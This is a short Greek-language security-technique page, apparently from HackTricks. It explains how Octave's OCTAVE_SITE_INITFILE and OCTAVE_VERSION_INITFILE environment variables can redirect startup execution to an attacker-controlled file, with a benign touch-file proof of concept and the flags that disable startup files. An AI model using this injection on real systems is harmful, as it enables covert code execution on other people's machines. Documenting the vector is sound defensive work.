# Έγχυση σε Εφαρμογές GNU Octave του macOS

{{#include ../../../banners/hacktricks-training.md}}

## `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

Το GNU Octave εκτελεί κατά την εκκίνηση αρκετά αρχεία που περιέχουν έγκυρες εντολές Octave. Το `OCTAVE_SITE_INITFILE` παρακάμπτει το startup file σε επίπεδο site και το `OCTAVE_VERSION_INITFILE` παρακάμπτει το version-specific startup file, επιτρέποντας σε οποιαδήποτε από τις δύο μεταβλητές να ανακατευθύνει την αυτόματη εκτέλεση σε ένα αρχείο αναγνώσιμο από τον attacker.<sup>[[1]](#references)</sup>
```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```
`--no-init-file` παρακάμπτει μόνο αρχεία χρήστη όπως το `~/.octaverc`· **δεν** σταματά την παραπάνω παράκαμψη του site-file. Χρησιμοποιήστε το `--no-site-file` για τα site files ή τα `--norc` / `-f` για να απενεργοποιήσετε όλα τα αρχεία εκκίνησης.<sup>[[2]](#references)</sup>

## References

- [1] [Αρχεία εκκίνησης του GNU Octave](https://docs.octave.org/latest/Startup-Files.html)
- [2] [Επιλογές γραμμής εντολών του GNU Octave](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
